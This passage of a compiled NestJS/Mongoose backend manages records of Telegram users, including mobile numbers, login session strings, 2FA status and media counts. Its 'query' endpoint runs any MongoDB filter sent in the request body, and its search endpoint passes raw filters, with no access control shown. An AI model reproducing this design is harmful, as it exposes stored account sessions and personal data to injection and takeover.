    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchDto {
}
exports.SearchDto = SearchDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Picture count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last message timestamp', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Limit time', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Can reply', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pay amount', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username' }),
    __metadata("design:type", String)
], SearchDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Access hash' }),
    __metadata("design:type", String)
], SearchDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid reply status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Second show status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile name' }),
    (0, class_transformer_1.Transform)(({ value }) => value === null || value === void 0 ? void 0 : value.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Chat ID' }),
    __metadata("design:type", String)
], SearchDto.prototype, "chatId", void 0);


/***/ }),

/***/ "./nest/components/user-data/schemas/user-data.schema.ts":
/*!***************************************************************!*\
  !*** ./nest/components/user-data/schemas/user-data.schema.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataSchema = exports.UserData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let UserData = class UserData {
};
exports.UserData = UserData;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "totalCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "picCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "limitTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "paidCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "prfCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "canReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "payAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "accessHash", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "paidReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "demoGiven", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "secondShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "profile", void 0);
exports.UserData = UserData = __decorate([
    (0, mongoose_1.Schema)({ collection: 'userData', versionKey: false, autoIndex: true })
], UserData);
exports.UserDataSchema = mongoose_1.SchemaFactory.createForClass(UserData);


/***/ }),

/***/ "./nest/components/user-data/user-data.controller.ts":
/*!***********************************************************!*\
  !*** ./nest/components/user-data/user-data.controller.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./nest/components/user-data/user-data.service.ts");
const create_user_data_dto_1 = __webpack_require__(/*! ./dto/create-user-data.dto */ "./nest/components/user-data/dto/create-user-data.dto.ts");
const search_user_data_dto_1 = __webpack_require__(/*! ./dto/search-user-data.dto */ "./nest/components/user-data/dto/search-user-data.dto.ts");
let UserDataController = class UserDataController {
    constructor(userDataService) {
        this.userDataService = userDataService;
    }
    create(createUserDataDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.create(createUserDataDto);
        });
    }
    search(query) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.search(query);
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.findAll();
        });
    }
    findOne(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.findOne(chatId);
        });
    }
    update(chatId, updateUserDataDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.update(chatId, updateUserDataDto);
        });
    }
    remove(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataService.remove(chatId);
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.userDataService.executeQuery(query);
            }
            catch (error) {
                throw error; // You might want to handle errors more gracefully
            }
        });
    }
};
exports.UserDataController = UserDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' })
    //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })
    //@apiresponse({ status: 403, description: 'Forbidden.' })
    ,
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_data_dto_1.CreateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' })
    //@apiresponse({ status: 200, description: 'Return the searched user data.' })
    ,
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_data_dto_1.SearchDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' })
    //@apiresponse({ status: 200, description: 'Return all user data.' })
    //@apiresponse({ status: 403, description: 'Forbidden.' })
    ,
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' })
    //@apiresponse({ status: 200, description: 'Return the user data.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' })
    //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' })
    //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' })
    //@apiresponse({ status: 200, description: 'Query executed successfully.' })
    //@apiresponse({ status: 400, description: 'Invalid query.' })
    //@apiresponse({ status: 500, description: 'Internal server error.' })
    ,
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "executeQuery", null);
exports.UserDataController = UserDataController = __decorate([
    (0, swagger_1.ApiTags)('UserData of TG clients'),
    (0, common_1.Controller)('userData'),
    __metadata("design:paramtypes", [user_data_service_1.UserDataService])
], UserDataController);


/***/ }),

/***/ "./nest/components/user-data/user-data.module.ts":
/*!*******************************************************!*\
  !*** ./nest/components/user-data/user-data.module.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./nest/components/user-data/schemas/user-data.schema.ts");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./nest/components/user-data/user-data.service.ts");
const user_data_controller_1 = __webpack_require__(/*! ./user-data.controller */ "./nest/components/user-data/user-data.controller.ts");
let UserDataModule = class UserDataModule {
};
exports.UserDataModule = UserDataModule;
exports.UserDataModule = UserDataModule = __decorate([
    (0, common_1.Module)({
        imports: [mongoose_1.MongooseModule.forFeature([{ name: user_data_schema_1.UserData.name, schema: user_data_schema_1.UserDataSchema }])],
        controllers: [user_data_controller_1.UserDataController],
        providers: [user_data_service_1.UserDataService],
    })
], UserDataModule);


/***/ }),

/***/ "./nest/components/user-data/user-data.service.ts":
/*!********************************************************!*\
  !*** ./nest/components/user-data/user-data.service.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./nest/components/user-data/schemas/user-data.schema.ts");
let UserDataService = class UserDataService {
    constructor(userDataModel) {
        this.userDataModel = userDataModel;
    }
    create(createUserDataDto) {
        return __awaiter(this, void 0, void 0, function* () {
            const createdUser = new this.userDataModel(createUserDataDto);
            return createdUser.save();
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userDataModel.find().exec();
        });
    }
    findOne(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const user = yield this.userDataModel.findOne({ chatId }).exec();
            if (!user) {
                throw new common_1.NotFoundException(`UserData with ID "${chatId}" not found`);
            }
            return user;
        });
    }
    update(chatId, updateUserDataDto) {
        return __awaiter(this, void 0, void 0, function* () {
            delete updateUserDataDto['_id'];
            const updatedUser = yield this.userDataModel.findOneAndUpdate({ chatId }, { $set: updateUserDataDto }, { new: true }).exec();
            if (!updatedUser) {
                throw new common_1.NotFoundException(`UserData with ID "${chatId}" not found`);
            }
            return updatedUser;
        });
    }
    remove(chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            const deletedUser = yield this.userDataModel.findOneAndDelete({ chatId }).exec();
            if (!deletedUser) {
                throw new common_1.NotFoundException(`UserData with ID "${chatId}" not found`);
            }
            return deletedUser;
        });
    }
    search(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(filter);
            if (filter.firstName) {
                filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
            }
            console.log(filter);
            return this.userDataModel.find(filter).exec();
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!query) {
                    throw new common_1.BadRequestException('Query is invalid.');
                }
                return yield this.userDataModel.find(query).exec();
            }
            catch (error) {
                throw new common_1.InternalServerErrorException(error.message);
            }
        });
    }
};
exports.UserDataService = UserDataService;
exports.UserDataService = UserDataService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(user_data_schema_1.UserData.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UserDataService);


/***/ }),

/***/ "./nest/components/users/dto/search-user.dto.ts":
/*!******************************************************!*\
  !*** ./nest/components/users/dto/search-user.dto.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchUserDto {
}
exports.SearchUserDto = SearchUserDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status' }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === '1' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status' }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === '1' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by date' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "date", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last updated timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownVideoCount", void 0);


/***/ }),

/***/ "./nest/components/users/schemas/user.schema.ts":
/*!******************************************************!*\
  !*** ./nest/components/users/schemas/user.schema.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserSchema = exports.User = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let User = class User extends mongoose_2.default.Document {
};
exports.User = User;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Boolean)
], User.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "date", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
